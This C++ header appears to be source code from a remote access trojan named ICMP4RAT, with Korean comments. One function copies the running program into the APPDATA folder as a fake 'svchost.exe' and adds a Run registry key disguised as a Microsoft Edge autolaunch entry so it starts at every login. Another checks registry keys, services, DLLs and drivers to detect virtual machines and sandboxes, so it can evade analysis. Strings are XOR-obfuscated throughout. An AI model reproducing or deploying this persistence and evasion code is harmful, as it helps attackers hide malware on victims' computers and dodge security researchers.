#pragma once
//#include <Windows.h>
#include <iostream>
#include <string>
#include <list>
#include "HashFunction_initialize.h"
//#include "wmic.h"

void autoExecute() {
    CHAR szDir[260];
    CHAR pName[260];

    GetEnvironmentVariableA_c(StringXOR("DUUADQD", 5).c_str(), szDir, 260); //APPDATA

    std::string str(szDir);
    str += "\\ICMP4RAT";
    GetModuleFileNameA_c(GetModuleHandle(0), pName, 260);
    CreateDirectoryA_c(str.c_str(), NULL);

    str += StringXOR("YYvsfmjvq+`}`", 5).c_str(); //svchost.exe
    CopyFileA_c(pName, str.c_str(), FALSE);

    char Driver[MAX_PATH];
    HKEY hKey;
    strcpy_s(Driver, str.c_str());
    
    RegOpenKeyExA_c(HKEY_CURRENT_USER, StringXOR("VJCQRDW@YYHlfwjvjcqYYRlkajrvYYFpww`kqS`wvljkYYWpk", 5).c_str(), 0, KEY_SET_VALUE, &hKey); //SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run
    RegSetValueExA_c(hKey, StringXOR("Hlfwjvjcq@ab`DpqjIdpkfmZ07F06CFG41007467FG6FG6ADDGA474G", 5).c_str(), 0, REG_SZ, (const unsigned char*)Driver, MAX_PATH); //MicrosoftEdgeAutoLaunch_52C53FCB14552132CB3CB3DAABD121B
    RegCloseKey_c(hKey);
}

/* VM이 아닐경우 TRUE 반환 */
bool Anti_VM() {
    //WMIC wc;
    //std::string bios_info = wc.getBIOSInfo();

    HKEY hKey;
    std::list<std::string> services = { StringXOR("sufgpv", 5).c_str(), StringXOR("suf(v6", 5).c_str(), StringXOR("sufmpg", 5).c_str(), StringXOR("hvshhjpc", 5).c_str(), StringXOR("SGj}Hjpv`", 5).c_str(), StringXOR("SGj}Bp`vq", 5).c_str(),  StringXOR("SGj}Bp`vq", 5).c_str(), StringXOR("SGj}VC", 5).c_str(), StringXOR("}`k`sqfmk", 5).c_str(), StringXOR("}`kk`q", 5).c_str(), StringXOR("}`kk`q3", 5).c_str(), StringXOR("}`kvsf", 5).c_str(), StringXOR("}`ksag", 5).c_str()};
    std::list<std::string> modules = { StringXOR("agbm`iu", 5).c_str(),  StringXOR("Vgl`Aii", 5).c_str(),  StringXOR("dulZijb", 5).c_str(), StringXOR("alwZrdqfm", 5).c_str(), StringXOR("uvqjw`f", 5).c_str() };
    std::list<std::string> drivers = { StringXOR("mvcv+v|v", 5).c_str(), StringXOR("shmbcv+v|v", 5).c_str(), StringXOR("uwi`qm+v|v", 5).c_str(), StringXOR("uwicv+v|v", 5).c_str(), StringXOR("uwihjpv`+v|v", 5).c_str(), StringXOR("uwisla`j+v|v", 5).c_str(), StringXOR("uwiZus67+v|v", 5).c_str(), StringXOR("suf(v6+v|v", 5).c_str(), StringXOR("shvwsf+v|v", 5).c_str(),  StringXOR("sh}=3+v|v", 5).c_str(), StringXOR("shk`q+v|v", 5).c_str() };
    std::list<std::string> bioses = { StringXOR("SHrdw`", 5).c_str(), StringXOR("SGJ]", 5).c_str(), StringXOR("SHR", 5).c_str(), StringXOR("M|u`w(S", 5).c_str(), StringXOR("m|u`w(s", 5).c_str()};


    /* 레지스트리 비교 */
    if (RegOpenKeyExA_c(HKEY_LOCAL_MACHINE, StringXOR("VJCQRDW@YYShrdw`)%Lkf+YYSHrdw`%Qjjiv", 5).c_str(), 0, KEY_QUERY_VALUE, &hKey) == ERROR_SUCCESS) {
        return false;
    }
    else if (RegOpenKeyExA_c(HKEY_LOCAL_MACHINE, StringXOR("VJCQRDW@YYShrdw`%LkfYYSHrdw`%Qjjiv", 5).c_str(), 0, KEY_QUERY_VALUE, &hKey) == ERROR_SUCCESS) {
        return false;
    }

    /* bios 정보로 확인 */
    //for (std::string bios : bioses)
    //{
    //    if (bios_info.find(bios) != std::string::npos)
    //    {
    //        return false;
    //    }
    //}

    std::string prefix = StringXOR("V\VQ@HYYFjkqwjiV`q554YYV`wslf`vYY", 5).c_str();
    for (std::string service : services) {
        std::string tmp = prefix + service;
        if (RegOpenKeyExA_c(HKEY_LOCAL_MACHINE,tmp.c_str(), 0, KEY_QUERY_VALUE, &hKey) == ERROR_SUCCESS) {
            std::cout << tmp.c_str() << std::endl;
            return false;
        }
    }
    /* dll 파일 비교 */
    for (std::string module : modules) {
        if (GetModuleHandleA_c(module.c_str()) != NULL) {
            return false;
        }
    }
     
    /* driver 파일 비교 */
    HANDLE hFind = INVALID_HANDLE_VALUE;
    WIN32_FIND_DATAA FindFileData;
    hFind = FindFirstFileA_c(StringXOR("F?YYRlkajrvYYV|vq`h67YY/+v|v", 5).c_str(), &FindFileData);
    if (hFind != INVALID_HANDLE_VALUE) {
        while (FindNextFileA_c(hFind, &FindFileData) != 0)
        {
            for (std::string driver : drivers) {
                if (!driver.compare(FindFileData.cFileName)) {
                    return false;
                }
            }
        }
    }
    FindClose_c(hFind);

    return true;
}